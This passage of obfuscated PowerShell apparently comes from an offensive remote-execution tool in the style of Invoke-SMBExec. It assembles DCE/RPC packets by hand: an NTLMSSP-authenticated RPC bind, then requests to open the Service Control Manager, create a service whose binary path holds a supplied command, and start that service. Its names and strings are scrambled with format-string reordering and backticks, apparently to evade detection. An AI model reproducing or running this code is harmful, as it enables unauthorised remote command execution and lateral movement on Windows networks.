        ${PAckEt`_`Rpc`BIND}.("{0}{1}"-f'Ad','d').Invoke(("{0}{3}{1}{5}{4}{2}"-f'RPC','d_','r2','Bin','xVe','TransferSynta'),[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif(${PACK`Et_nuM_Ctx`_IT`eMs}[0] -eq 3)
    {
        ${P`AckeT_`RpCBI`ND}.("{1}{0}" -f'dd','A').Invoke(("{1}{0}{4}{3}{2}"-f'ind_C','RPCB','ID2','xt','onte'),[Byte[]](0x01,0x00))
        ${PACk`Et_rPC`B`inD}.("{0}{1}" -f'A','dd').Invoke(("{3}{2}{6}{5}{4}{0}{1}"-f 'tem','s2','i','RPCB','I','rans','nd_NumT'),[Byte[]](0x01))
        ${pA`c`ket`_RPcbI`ND}.("{0}{1}"-f'Ad','d').Invoke(("{0}{3}{5}{4}{1}{2}"-f 'RPCB','w','n3','in','Unkno','d_'),[Byte[]](0x00))
        ${PA`C`Ket_`RPCbiNd}.("{0}{1}" -f 'A','dd').Invoke(("{1}{2}{3}{4}{0}" -f'ce2','RPC','Bin','d_','Interfa'),[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        ${PA`cKeT_rpc`Bi`ND}.("{0}{1}" -f'Ad','d').Invoke(("{0}{1}{3}{2}"-f 'RP','CBind_I','faceVer2','nter'),[Byte[]](0x00,0x00))
        ${PAcKet_`RP`cb`i`Nd}.("{0}{1}"-f'A','dd').Invoke(("{1}{4}{3}{2}{0}" -f 'or2','RPCBind_Inte','rMin','faceVe','r'),[Byte[]](0x00,0x00))
        ${paCkE`T`_rPcb`inD}.("{1}{0}" -f 'dd','A').Invoke(("{0}{1}{5}{2}{3}{4}" -f'RP','C','_','Trans','ferSyntax2','Bind'),[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        ${P`A`ck`Et_r`PcbIND}.("{1}{0}"-f 'dd','A').Invoke(("{3}{2}{5}{1}{4}{0}"-f'taxVer2','nsfer','PCBind_','R','Syn','Tra'),[Byte[]](0x01,0x00,0x00,0x00))
        ${PaC`k`et_RpCBinD}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}{3}{2}"-f 'RPCBind','_','D3','ContextI'),[Byte[]](0x02,0x00))
        ${paC`kE`T_`RPcbINd}.("{0}{1}" -f 'Ad','d').Invoke(("{2}{1}{3}{0}" -f'sItems3','nd_NumT','RPCBi','ran'),[Byte[]](0x01))
        ${P`Ac`K`Et_RPCbind}.("{0}{1}"-f'A','dd').Invoke(("{4}{3}{2}{0}{1}"-f 'n','known4','ind_U','B','RPC'),[Byte[]](0x00))
        ${Pa`c`k`ET_R`PcbIND}.("{0}{1}" -f 'Ad','d').Invoke(("{4}{2}{0}{3}{1}" -f'_','rface3','PCBind','Inte','R'),[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        ${pACKE`T_Rp`Cbi`ND}.("{1}{0}" -f'dd','A').Invoke(("{1}{0}{2}{3}"-f 'terface','RPCBind_In','Ver','3'),[Byte[]](0x00,0x00))
        ${Pa`C`KeT_rp`Cb`ind}.("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}{5}{2}{6}{3}{4}" -f 'RP','CBi','_','ceVerM','inor3','nd','Interfa'),[Byte[]](0x00,0x00))
        ${packEt_r`PC`Bi`ND}.("{1}{0}" -f 'dd','A').Invoke(("{0}{2}{1}{3}{4}" -f'RP','an','CBind_Tr','sferSy','ntax3'),[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${paCKEt_`Rp`C`B`inD}.("{1}{0}"-f 'dd','A').Invoke(("{4}{1}{2}{0}{5}{3}"-f 'x','ind_TransferS','ynta','3','RPCB','Ver'),[Byte[]](0x01,0x00,0x00,0x00))
        ${pAC`KET_rp`CBi`ND}.("{1}{0}"-f 'd','Ad').Invoke(("{1}{4}{3}{2}{0}" -f'e','RPC','p','d_AuthTy','Bin'),[Byte[]](0x0a))
        ${Pac`Ke`T`_RpcBi`ND}.("{0}{1}" -f'A','dd').Invoke(("{3}{0}{1}{2}{5}{4}" -f 'CBi','nd_Au','th','RP','l','Leve'),[Byte[]](0x04))
        ${P`Ac`keT_rPC`Bi`ND}.("{0}{1}"-f 'A','dd').Invoke(("{0}{3}{2}{1}"-f 'RPCBind_AuthPadL','th','ng','e'),[Byte[]](0x00))
        ${pAcke`T_RPCb`I`Nd}.("{0}{1}"-f 'Ad','d').Invoke(("{2}{0}{3}{1}"-f'nd','ved','RPCBi','_AuthReser'),[Byte[]](0x00))
        ${P`AcKEt_rpC`BInD}.("{1}{0}"-f'd','Ad').Invoke(("{1}{3}{0}{2}" -f 'D','RPCB','4','ind_ContextI'),[Byte[]](0x00,0x00,0x00,0x00))
        ${Pa`Ck`eT`_RpCBINd}.("{0}{1}" -f'Ad','d').Invoke(("{2}{5}{0}{3}{4}{1}"-f'Bind','r','RP','_Iden','tifie','C'),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        ${Pack`E`T_RpC`B`iNd}.("{0}{1}" -f 'A','dd').Invoke(("{1}{0}{3}{4}{5}{2}" -f'CBin','RP','eType','d_M','ess','ag'),[Byte[]](0x01,0x00,0x00,0x00))
        ${PA`cKe`T_RPCbI`Nd}.("{1}{0}"-f'dd','A').Invoke(("{3}{4}{1}{2}{0}"-f 's','d_NegotiateFl','ag','RPCBi','n'),[Byte[]](0x97,0x82,0x08,0xe2))
        ${p`A`CkET_rp`cBi`ND}.("{1}{0}"-f'd','Ad').Invoke(("{6}{5}{1}{4}{2}{3}{0}" -f 'in','al','kstat','ionDoma','lingWor','ind_C','RPCB'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${PA`ck`Et_rp`CBInd}.("{0}{1}" -f'A','dd').Invoke(("{3}{1}{4}{2}{0}" -f'onName','CBi','ingWorkstati','RP','nd_Call'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${PAcke`T_`RPCbI`ND}.("{1}{0}" -f'd','Ad').Invoke(("{0}{2}{3}{1}"-f 'R','sion','PCBind_O','SVer'),[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    if(${P`ACK`eT`_`cAll_ID} -eq 3)
    {
        ${PaCK`Et`_RpCb`INd}.("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{1}{3}"-f 'RPCBi','ut','nd_A','hType'),[Byte[]](0x0a))
        ${pACK`eT_Rp`cB`IND}.("{0}{1}" -f'Ad','d').Invoke(("{0}{1}{2}{3}" -f 'R','PCBind_AuthL','e','vel'),[Byte[]](0x02))
        ${pa`CKE`T`_RPcbiND}.("{1}{0}" -f 'd','Ad').Invoke(("{0}{2}{3}{5}{4}{1}" -f 'RPCBi','gth','nd','_A','en','uthPadL'),[Byte[]](0x00))
        ${PaCkET_RP`Cb`I`Nd}.("{1}{0}"-f 'dd','A').Invoke(("{0}{4}{2}{3}{1}" -f 'RP','eserved','Bin','d_AuthR','C'),[Byte[]](0x00))
        ${PAc`ke`T_rp`cB`iNd}.("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{3}{2}" -f 'Bind','RPC','xtID3','_Conte'),[Byte[]](0x00,0x00,0x00,0x00))
        ${P`A`ckET_rpcbI`ND}.("{1}{0}"-f'dd','A').Invoke(("{1}{2}{0}{3}{4}{5}"-f'CB','R','P','ind_Id','entifi','er'),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        ${P`AcK`ET`_RP`CbIND}.("{1}{0}" -f 'dd','A').Invoke(("{3}{2}{1}{4}{5}{0}" -f 'e','s','s','RPCBind_Me','ag','eTyp'),[Byte[]](0x01,0x00,0x00,0x00))
        ${paCKeT`_rp`C`B`inD}.("{0}{1}" -f'A','dd').Invoke(("{3}{0}{1}{2}{5}{4}" -f'PCBin','d_Negot','iateFl','R','s','ag'),[Byte[]](0x97,0x82,0x08,0xe2))
        ${pAc`KeT_r`P`CBi`ND}.("{1}{0}"-f'dd','A').Invoke(("{4}{1}{3}{0}{5}{6}{2}"-f'tionDom','or','n','ksta','RPCBind_CallingW','a','i'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${p`AC`KeT_`RPcBi`Nd}.("{0}{1}"-f'Ad','d').Invoke(("{0}{7}{2}{6}{4}{1}{3}{5}" -f 'RPCBind_Ca','nNa','orks','m','tio','e','ta','llingW'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${paCkE`T`_r`pcBI`ND}.("{1}{0}"-f'd','Ad').Invoke(("{4}{0}{3}{1}{2}" -f'PCBin','OSV','ersion','d_','R'),[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    return ${paCKE`T_RPc`BI`ND}
}

function GET-Pa`C`K`ETrPCR`e`QuE`ST()
{
    param([Byte[]]${PAc`k`eT_`FlA`Gs},[Int]${PA`c`keT_sERvIc`E_l`E`Ngth},[Int]${P`ACkET_A`UTh_leng`TH},[Int]${PACk`et_A`UtH_Pad`di`Ng},[Byte[]]${paCkeT_`caL`l`_id},[Byte[]]${PA`Ck`e`T_coNtExt_id},[Byte[]]${PAC`KE`T_OpNum},[Byte[]]${PAcke`T`_`dATA})

    if(${pA`CkET`_AUt`H`_`lEngTh} -gt 0)
    {
        ${Pa`CkEt`_F`U`LL_`AUTh_Leng`Th} = ${pACkEt_`A`U`Th_LENgth} + ${p`AcK`e`T`_AUT`H`_PaDdiNg} + 8
    }

    [Byte[]]${p`AckE`T_wR`i`Te_lEn`GTH} =  ( &("{1}{0}{2}"-f'RIA','va','blE') ('8'+'14')  ).vaLue::("{2}{0}{1}" -f'te','s','GetBy').Invoke(${Pa`CKeT_SE`R`VI`cE`_lENg`Th} + 24 + ${Pa`ck`e`T_fUlL_aUtH`_lEn`Gth} + ${PacKe`T_`datA}."LeN`gth")
    [Byte[]]${p`A`CkeT`_FRaG_LE`NGTh} = ${p`AcKET_wRi`Te_l`En`GTh}[0,1]
    [Byte[]]${pac`k`ET_a`lLOC_h`i`Nt} =  (  &("{3}{2}{0}{4}{1}" -f 'C','TEM','t-','ge','HiLdi') ('VA'+'rIAbl'+'e:814') ).VALuE::("{0}{1}{2}" -f'Get','Byt','es').Invoke(${pa`C`k`E`T_serVICe`_Len`GTh} + ${paCKet`_D`A`TA}."L`eng`Th")
    [Byte[]]${pacKe`T`_aUt`h_l`EnGth} =  ${8`14}::("{0}{1}" -f 'GetBy','tes').Invoke(${Pac`KET_a`U`Th_lE`NgtH})
    ${packE`T_`Auth_leng`Th} = ${pacKET_auTh`_l`eN`GtH}[0,1]

    ${PAC`KEt_rpCreQ`U`e`st} = &("{0}{1}{2}" -f'New','-Obje','ct') ("{3}{6}{9}{10}{0}{1}{2}{7}{5}{12}{4}{11}{8}" -f'lectio','n','s.Spe','System','D','ialized.Ord','.','c','ionary','Co','l','ict','ered')
    ${PaCK`e`T_Rp`cre`Q`Uest}.("{0}{1}" -f'Ad','d').Invoke(("{0}{1}{2}{3}"-f'RPC','Reque','st_','Version'),[Byte[]](0x05))
    ${P`AckEt_`R`PcrEQ`U`eSt}.("{1}{0}"-f 'dd','A').Invoke(("{1}{5}{2}{4}{0}{3}{6}"-f 'r','RPCRequ','st_V','si','e','e','onMinor'),[Byte[]](0x00))
    ${p`Ac`ke`T_rp`CReQ`Uest}.("{0}{1}"-f'Ad','d').Invoke(("{3}{2}{1}{0}" -f'ype','T','CRequest_Packet','RP'),[Byte[]](0x00))
    ${p`ACkET_RPc`Reque`sT}.("{1}{0}" -f'dd','A').Invoke(("{6}{3}{0}{1}{4}{5}{2}"-f 't_','Packe','ags','ues','t','Fl','RPCReq'),${pA`cK`ET_f`lAgS})
    ${pAC`ke`T_RpcR`e`q`UeST}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}{3}{4}{2}{5}"-f'RP','CRequest_','ntatio','D','ataReprese','n'),[Byte[]](0x10,0x00,0x00,0x00))
    ${p`ACkeT_`RPcRe`QUE`st}.("{0}{1}"-f 'A','dd').Invoke(("{1}{2}{4}{0}{6}{3}{5}" -f'_F','R','PCRe','g','quest','th','ragLen'),${P`A`CKe`T_fr`AG_Len`gTH})
    ${p`ACk`et_`R`pcreq`UEsT}.("{0}{1}" -f'Ad','d').Invoke(("{0}{2}{4}{3}{1}"-f 'RPCReq','h','uest_AuthLe','t','ng'),${paC`K`Et_aUtH`_LENgth})
    ${p`ACkET`_rpC`REQUeST}.("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{1}{3}"-f 'RPCReq','Call','uest_','ID'),${PaCkEt_C`Al`l`_ID})
    ${Pa`ckEt`_`RpCRequEsT}.("{1}{0}" -f 'dd','A').Invoke(("{1}{2}{0}{3}"-f '_','RPCReq','uest','AllocHint'),${PACke`T`_AL`LoC_`hint})
    ${pAck`ET_R`P`cREqU`E`ST}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}{4}{3}{2}"-f'PC','R','ID','uest_Context','Req'),${PACK`E`T_`ConT`ex`T_ID})
    ${p`Ac`K`ET`_R`pcREQUEsT}.("{0}{1}" -f'Ad','d').Invoke(("{1}{2}{3}{0}"-f'm','RPCR','eque','st_Opnu'),${Pac`KE`T_opNUM})

    if(${Pa`CkeT_`Da`Ta}."l`E`NgTh")
    {
        ${PacKet_rPC`R`eq`U`eSt}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{3}{0}{2}" -f'es','RP','t_Data','CRequ'),${Pa`cKe`T_dAta})
    }

    return ${pAckEt`_rpc`ReQUe`st}
}



function GEt-paCk`E`T`SC`mOP`ENSCMAn`AGeRW()
{
    param ([Byte[]]${pACkE`T_S`erv`i`ce},[Byte[]]${p`Ac`kEt_sE`RVICe_lenG`Th})

    [Byte[]]${pAcK`et_`wr`i`TE`_LEnGtH} =  (  &('GI')  ("{1}{0}{2}"-f'BlE:','VaRIA','814')  ).vALUE::("{0}{1}{2}"-f'Ge','t','Bytes').Invoke(${pACk`Et`_Se`R`VIcE}."Le`NGtH" + 92)
    [Byte[]]${PA`c`keT_f`RaG_LEnG`TH} = ${PACkeT`_WRiT`e_`le`NgTH}[0,1]
    [Byte[]]${p`AckET_A`l`LOc`_hint} =   ( &("{2}{0}{1}" -f 'rIAB','lE','vA') 814  ).vALuE::("{1}{0}{2}" -f't','GetBy','es').Invoke(${PacKet_`S`ervIcE}."LeN`G`Th" + 68)
    ${pAc`ke`T`_R`eF`ereNT_id1} = [String](1..2 | &("{1}{0}{2}{3}"-f 'h-O','ForEac','bj','ect') {"{0:X2}" -f (&("{0}{2}{1}"-f'G','om','et-Rand') -Minimum 1 -Maximum 255)})
    ${PacKEt_r`eF`ERent`_I`d1} = ${P`AcKet`_RE`F`eRENT_iD1}.("{0}{1}" -f'Sp','lit').Invoke(" ") | &("{3}{4}{1}{2}{0}" -f 't','je','c','ForEa','ch-Ob'){[Char] ${X0`g`y26}::("{1}{0}"-f 'Int16','To').Invoke(${_},16)}
    ${packET_`R`eFerEn`T_id1} += 0x00,0x00
    ${Pa`CkeT_ReFeREnt`_I`d2} = [String](1..2 | &("{1}{2}{0}{3}"-f'Each-Objec','Fo','r','t') {"{0:X2}" -f (&("{1}{2}{0}" -f'dom','G','et-Ran') -Minimum 1 -Maximum 255)})
    ${PAckET_Re`F`eREN`T_`iD2} = ${paCkE`T_rE`FEr`eN`T_id2}.("{0}{1}" -f 'Sp','lit').Invoke(" ") | &("{1}{0}{2}{3}"-f 'ach-','ForE','O','bject'){[Char] (  &("{0}{1}" -f'vARI','ablE') ("{2}{1}{0}"-f'Y26','G','x0') ).VALUe::("{1}{2}{0}" -f '16','T','oInt').Invoke(${_},16)}
    ${paCK`Et_rE`FerE`N`T_id2} += 0x00,0x00

    ${p`Ac`kEt_SCM`OP`eNSCMaNA`geRw} = &("{0}{1}{2}" -f 'New-O','bjec','t') ("{9}{11}{5}{3}{4}{6}{2}{7}{0}{8}{10}{1}"-f'edDi','y','r','ollections.','Spe','tem.C','cialized.O','der','ctio','Sy','nar','s')
    ${PA`c`k`ET_scMoPEN`SCM`AnageRW}.("{1}{0}" -f'dd','A').Invoke(("{8}{5}{9}{7}{1}{3}{6}{4}{10}{0}{2}{11}{12}"-f'me_Refe','gerW','ren','_','achine','nS','M','Mana','SCMOpe','C','Na','tI','D'),${pAC`kET_rEferE`N`T_`iD1})
    ${paCket_`SCM`o`Pen`scM`AnAg`E`Rw}.("{0}{1}"-f 'Ad','d').Invoke(("{2}{7}{9}{5}{8}{1}{6}{10}{0}{3}{4}" -f'Max','n','SCMOpe','Coun','t','gerW_Mach','eNam','nSC','i','Mana','e_'),${pA`Ck`et`_Se`RvicE_lEnGth})
    ${Pa`ck`et_scMO`P`EN`SCmaNA`GeRW}.("{1}{0}"-f 'd','Ad').Invoke(("{8}{3}{0}{1}{6}{7}{4}{5}{2}"-f 'SCManagerW_Ma','c','set','CMOpen','Of','f','hineNam','e_','S'),[Byte[]](0x00,0x00,0x00,0x00))
    ${PaCKET`_`ScmoPen`S`cM`Anag`ERW}.("{1}{0}"-f 'd','Ad').Invoke(("{5}{7}{8}{4}{9}{2}{0}{1}{3}{6}" -f'M','achineNam','W_','e_Actual','enSCMa','SC','Count','M','Op','nager'),${pACKet_sE`Rv`ice`_LeN`gTH})
    ${Pa`C`KeT`_`s`cMOPen`sCMANa`GERW}.("{1}{0}"-f 'dd','A').Invoke(("{3}{8}{7}{0}{2}{1}{6}{4}{5}" -f 'agerW','Mac','_','SCMOpen','ineN','ame','h','CMan','S'),${paC`kEt_`SE`RvICE})
    ${P`Acket_Sc`mOp`E`NSCMAna`g`e`Rw}.("{1}{0}"-f'd','Ad').Invoke(("{3}{5}{2}{1}{9}{4}{0}{6}{7}{10}{8}" -f 'tab','n','pe','SCM','W_Da','O','as','e','ID','SCManager','_Referent'),${p`AckET_re`FeReNT`_id2})
    ${P`AC`kEt`_ScMop`E`NsCMANaGERw}.("{1}{0}" -f'd','Ad').Invoke(("{5}{10}{1}{9}{0}{6}{4}{3}{7}{8}{2}" -f 'SCM','e','Count','e_N','atabas','S','anagerW_D','ame','Max','n','CMOp'),[Byte[]](0x0f,0x00,0x00,0x00))
    ${PACkeT_sCM`O`pE`NS`CM`AnaG`erW}.("{0}{1}"-f'Ad','d').Invoke(("{9}{7}{8}{1}{5}{6}{3}{2}{10}{0}{4}" -f 'se','g','eOf','e_Nam','t','erW_D','atabas','SCM','ana','SCMOpen','f'),[Byte[]](0x00,0x00,0x00,0x00))
    ${pAcKe`T`_`s`C`mOpen`SCManA`GERw}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{7}{9}{3}{6}{1}{5}{10}{4}{11}{2}{8}"-f'S','Da','o','nagerW','l','taba','_','CMOpenS','unt','CMa','se_NameActua','C'),[Byte[]](0x0f,0x00,0x00,0x00))
    ${p`Ac`KEt_s`cM`opENscM`A`NAGERW}.("{0}{1}"-f 'A','dd').Invoke(("{3}{1}{0}{2}{4}"-f'e','Op','nSCManagerW_Da','SCM','tabase'),[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
    ${Pa`cKE`T_`s`c`MopE`NsCmAnaGeRw}.("{1}{0}"-f'dd','A').Invoke(("{7}{1}{2}{6}{4}{0}{5}{3}"-f 'k','Man','ag','wn','W_Un','no','er','SCMOpenSC'),[Byte[]](0xbf,0xbf))
    ${p`AcK`et_SC`m`opE`NSCMAnaGerW}.("{0}{1}"-f'Ad','d').Invoke(("{6}{4}{8}{0}{7}{2}{3}{5}{1}"-f 'e','ask','e','rW_','C','AccessM','S','nSCManag','MOp'),[Byte[]](0x3f,0x00,0x00,0x00))
    
    return ${PaCKe`T_sC`mOpenScmaN`AgE`RW}
}

function GET`-`pACkETS`c`Mcrea`T`e`Servic`EW()
{
    param([Byte[]]${p`Ack`E`T_CoNteX`T_HAN`DLe},[Byte[]]${p`AcK`et`_SERVICE},[Byte[]]${PA`CkeT_SeR`VIcE_LENg`Th},
            [Byte[]]${Pac`Ket`_CO`MManD},[Byte[]]${packEt_Co`m`MAn`d_L`e`NGth})
                
    ${pAc`KEt_`R`E`F`erenT_iD} = [String](1..2 | &("{2}{4}{0}{1}{3}"-f'-O','bj','ForEa','ect','ch') {"{0:X2}" -f (&("{1}{0}{2}{3}" -f'-','Get','Ran','dom') -Minimum 1 -Maximum 255)})
    ${PAcKEt_R`Efer`E`Nt_id} = ${pAC`ke`T_rE`FE`REnT_ID}.("{1}{0}" -f 'lit','Sp').Invoke(" ") | &("{0}{2}{1}" -f'ForEa','ject','ch-Ob'){[Char]  ( &("{1}{0}"-f 'R','Di')  ("{0}{1}{3}{2}"-f'Var','I','Y26','aBLe:X0G')  ).vaLuE::("{0}{1}"-f'ToI','nt16').Invoke(${_},16)}
    ${pa`CkE`T`_`ReFerEnt`_`id} += 0x00,0x00

    ${PaCkE`T_`scMcR`e`ATES`Erv`IcEw} = &("{2}{0}{1}"-f 'bje','ct','New-O') ("{1}{4}{6}{3}{0}{5}{7}{11}{9}{12}{8}{10}{2}"-f'Co','Sys','ary','.','t','ll','em','ectio','redDicti','s.S','on','n','pecialized.Orde')
    ${P`AC`ke`T_sCmC`Reate`sErVIC`eW}.("{0}{1}"-f'Ad','d').Invoke(("{8}{9}{3}{2}{1}{0}{5}{4}{7}{6}"-f'nt','o','_C','eW','n','extHa','le','d','SCMCre','ateServic'),${pA`ck`et_`cOnT`exT`_hAND`Le})
    ${Pack`eT_S`cm`CRea`T`eseRv`iCEw}.("{0}{1}"-f'A','dd').Invoke(("{6}{0}{3}{1}{10}{7}{9}{2}{5}{4}{8}" -f 'MCre','t','xCo','a','n','u','SC','eNam','t','e_Ma','eServiceW_Servic'),${pa`CKE`T_`seRVi`CE_le`Ng`Th})
    ${PACKet_SC`mCReA`TeSe`Rvi`CeW}.("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{1}{5}{6}{4}{3}"-f'SCMCreateServiceW','rvic','_Se','et','fs','eN','ame_Of'),[Byte[]](0x00,0x00,0x00,0x00))
    ${pACKet`_SCmCR`E`AtE`ser`V`Ic`ew}.("{1}{0}" -f'd','Ad').Invoke(("{4}{5}{9}{1}{10}{8}{7}{0}{6}{2}{3}" -f'Name_','ceW_','lCo','unt','S','CMCreateSer','Actua','e','c','vi','Servi'),${Pack`eT_`S`erVICe_lEN`GTH})
    ${PacK`e`T_SC`Mcr`E`AteS`eRvIC`ew}.("{0}{1}" -f'A','dd').Invoke(("{8}{6}{5}{3}{2}{7}{0}{1}{4}"-f 'ce','Na','v','r','me','teSe','MCrea','iceW_Servi','SC'),${PACKe`T`_`s`eRviCe})
    ${P`A`cK`eT_s`CmCREa`TE`SERViCeW}.("{1}{0}"-f'd','Ad').Invoke(("{1}{8}{0}{2}{4}{5}{7}{3}{6}"-f'Create','SC','ServiceW_Displa','ntI','yName_','Refe','D','re','M'),${pa`cK`Et_`ReF`e`REnt_Id})
    ${P`AC`K`ET_Scmc`REATeSe`RViC`eW}.("{1}{0}"-f 'd','Ad').Invoke(("{8}{4}{10}{5}{3}{1}{7}{6}{0}{9}{2}" -f 'me','D','nt','W_','MCrea','ce','layNa','isp','SC','_MaxCou','teServi'),${Pa`cke`T`_Ser`VIc`E_lEnGtH})
    ${p`Ac`Ket`_`ScmC`ReateserVICeW}.("{1}{0}" -f'dd','A').Invoke(("{10}{3}{2}{7}{6}{5}{4}{9}{8}{1}{0}"-f 't','e','Servi','eate','yNa','pla','_Dis','ceW','ffs','me_O','SCMCr'),[Byte[]](0x00,0x00,0x00,0x00))
    ${pAcke`T_scmCRE`A`TeSE`RvI`C`Ew}.("{0}{1}"-f'Ad','d').Invoke(("{6}{0}{8}{9}{2}{7}{3}{1}{4}{5}"-f'Se','la','W','p','yName_ActualCoun','t','SCMCreate','_Dis','rvi','ce'),${pAcKE`T`_s`ervICe_`lenGTh})
    ${p`A`CKeT_`sCmcre`AteSERv`IcEw}.("{1}{0}"-f 'dd','A').Invoke(("{1}{8}{0}{6}{2}{5}{4}{3}{7}" -f 'r','SC','D','am','yN','ispla','viceW_','e','MCreateSe'),${P`A`Ck`Et_SErviCe})
    ${pACK`eT_SCMc`REaTe`S`erV`ICeW}.("{1}{0}" -f 'd','Ad').Invoke(("{4}{2}{3}{1}{0}" -f 'k','ceW_AccessMas','t','eServi','SCMCrea'),[Byte[]](0xff,0x01,0x0f,0x00))
    ${P`Ack`ET_`sCmCrE`At`E`seRvIC`eW}.("{0}{1}"-f 'A','dd').Invoke(("{1}{5}{3}{7}{6}{8}{2}{4}{0}" -f'eType','SC','v','at','ic','MCre','rvi','eSe','ceW_Ser'),[Byte[]](0x10,0x00,0x00,0x00))
    ${paCkeT`_sC`mc`ReAte`S`erViCew}.("{1}{0}"-f 'dd','A').Invoke(("{0}{5}{1}{3}{4}{7}{2}{6}" -f 'SCM','_Serv','Ty','iceSta','r','CreateServiceW','pe','t'),[Byte[]](0x03,0x00,0x00,0x00))
    ${pac`K`E`T`_scMc`ReATeSErvI`c`Ew}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{5}{8}{9}{7}{0}{3}{4}{6}" -f 'Err','SCMCr','eateSe','orC','ont','rv','rol','W_Service','i','ce'),[Byte[]](0x00,0x00,0x00,0x00))
    ${p`AcKet_s`CMc`REAte`seRVICEw}.("{0}{1}" -f 'A','dd').Invoke(("{6}{11}{9}{7}{0}{5}{2}{1}{10}{8}{4}{3}"-f 'eW_','naryPath','i','nt','u','B','SCMCr','c','me_MaxCo','ervi','Na','eateS'),${pAc`ket_Co`MmA`ND_`leNGth})
    ${PacKE`T`_ScmCReaTesEr`VI`CEW}.("{1}{0}"-f 'dd','A').Invoke(("{0}{7}{4}{9}{1}{8}{5}{2}{3}{6}" -f'SCMCreat','na','hName_Of','fse','ceW_B','yPat','t','eServi','r','i'),[Byte[]](0x00,0x00,0x00,0x00))
    ${pac`Ket`_Sc`mC`R`eaTESeR`VicEW}.("{0}{1}"-f 'A','dd').Invoke(("{4}{1}{6}{0}{5}{7}{2}{3}"-f'athName_Actu','viceW_Bina','n','t','SCMCreateSer','alCo','ryP','u'),${PACke`T_cO`m`MaN`d_L`ength})
    ${p`AckEt_`SCmcREate`SE`RViCEW}.("{1}{0}"-f 'd','Ad').Invoke(("{1}{3}{0}{6}{2}{5}{4}"-f 'inaryP','SCMCreat','t','eServiceW_B','me','hNa','a'),${P`Ac`KET`_comMA`Nd})
    ${PackeT_sc`MCReA`T`e`Se`Rv`IcEW}.("{1}{0}" -f'dd','A').Invoke(("{4}{7}{2}{0}{8}{5}{6}{3}{1}"-f'erv','er','eS','int','SCM','W_NU','LLPo','Creat','ice'),[Byte[]](0x00,0x00,0x00,0x00))
    ${pacKe`T_scM`c`REaT`ese`R`V`IcEw}.("{1}{0}"-f 'dd','A').Invoke(("{3}{4}{1}{0}{5}{2}"-f 'e','c','D','SC','MCreateServi','W_TagI'),[Byte[]](0x00,0x00,0x00,0x00))
    ${paCkE`T`_sc`Mcr`EAte`ServI`C`eW}.("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{1}{4}{3}{5}"-f 'SCMCrea','Ser','te','Point','viceW_NULL','er2'),[Byte[]](0x00,0x00,0x00,0x00))
    ${pAcKET`_s`c`mcReaTeSEr`ViCew}.("{1}{0}"-f'd','Ad').Invoke(("{1}{0}{2}{6}{3}{5}{4}"-f 'CMCr','S','eat','_Depe','e','ndSiz','eServiceW'),[Byte[]](0x00,0x00,0x00,0x00))
    ${pa`cKET`_ScMcREate`sE`Rv`IcEW}.("{0}{1}"-f 'A','dd').Invoke(("{6}{4}{5}{0}{3}{1}{2}" -f'_NUL','i','nter3','LPo','rvi','ceW','SCMCreateSe'),[Byte[]](0x00,0x00,0x00,0x00))
    ${PaCKE`T_`S`CMCRE`Ate`SERv`I`ceW}.("{1}{0}" -f'd','Ad').Invoke(("{3}{1}{2}{0}{5}{4}{6}"-f'er','MCreat','eS','SC','W_NULLPoin','vice','ter4'),[Byte[]](0x00,0x00,0x00,0x00))
    ${p`A`Cket_SCm`cr`EaT`ESeR`VIceW}.("{1}{0}"-f'd','Ad').Invoke(("{4}{5}{0}{2}{1}{3}" -f 'c','W','e','_PasswordSize','SCMCreateServ','i'),[Byte[]](0x00,0x00,0x00,0x00))

    return ${pa`Cke`T_ScM`CrE`ATEsE`R`VicEw}
}

function geT-pac`KE`TscmStAr`TS`ER`VIcEW()
{
    param([Byte[]]${pACkEt_co`N`TE`XT_hANdle})

    ${PAck`et_S`CmstARtSe`Rvic`eW} = &("{0}{1}{2}"-f 'N','ew-Ob','ject') ("{10}{2}{7}{3}{1}{5}{9}{0}{4}{8}{11}{6}"-f 'dere','s.','yst','llection','d','Speci','nary','em.Co','Dict','alized.Or','S','io')
    ${P`A`cke`T_S`cmsTArTseRvIcEW}.("{0}{1}" -f'A','dd').Invoke(("{2}{1}{5}{0}{6}{4}{3}" -f 'Serv','CMStar','S','tHandle','tex','t','iceW_Con'),${PAcke`T_co`NTEx`T_`hAndLe})
